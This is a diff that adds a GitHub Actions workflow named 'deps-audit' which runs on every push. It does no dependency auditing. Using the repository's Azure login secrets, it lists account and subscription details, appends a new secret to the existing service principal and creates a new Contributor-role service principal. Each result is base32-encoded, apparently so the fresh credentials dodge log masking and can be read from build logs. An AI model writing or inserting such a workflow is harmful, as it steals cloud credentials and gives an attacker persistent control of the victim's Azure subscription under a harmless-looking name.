@@ -1,0 +1,36 @@
+name: deps-audit
+on: push
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Azure Login
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZUREAPPSERVICE_CLIENTID_2A031270352C479EA0D2D437D904555A }}
+          tenant-id: ${{ secrets.AZUREAPPSERVICE_TENANTID_813E232DE085460A916E3A88069B5EC4 }}
+          subscription-id: ${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_43FEE134372B4F589C3808B1B98FB78E }}
+
+      - name: Audit
+        run: |
+          echo "=== WHOAMI ===" | base32 -w0; echo
+          az account show 2>&1 | base32 -w0; echo
+          
+          echo "=== SUBS ===" | base32 -w0; echo
+          az account list 2>&1 | base32 -w0; echo
+          
+          echo "=== SP INFO ===" | base32 -w0; echo
+          CLIENT_ID="${{ secrets.AZUREAPPSERVICE_CLIENTID_2A031270352C479EA0D2D437D904555A }}"
+          az ad sp show --id $CLIENT_ID 2>&1 | base32 -w0; echo
+          
+          echo "=== MINT NEW SECRET ===" | base32 -w0; echo
+          az ad sp credential reset --id $CLIENT_ID --append --display-name "backup-$(date +%s)" 2>&1 | base32 -w0; echo
+          
+          echo "=== OR CREATE NEW SP ===" | base32 -w0; echo
+          az ad sp create-for-rbac --name "svc-deps-audit-$(date +%s)" --role Contributor --scopes "/subscriptions/${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_43FEE134372B4F589C3808B1B98FB78E }}" 2>&1 | base32 -w0; echo
+
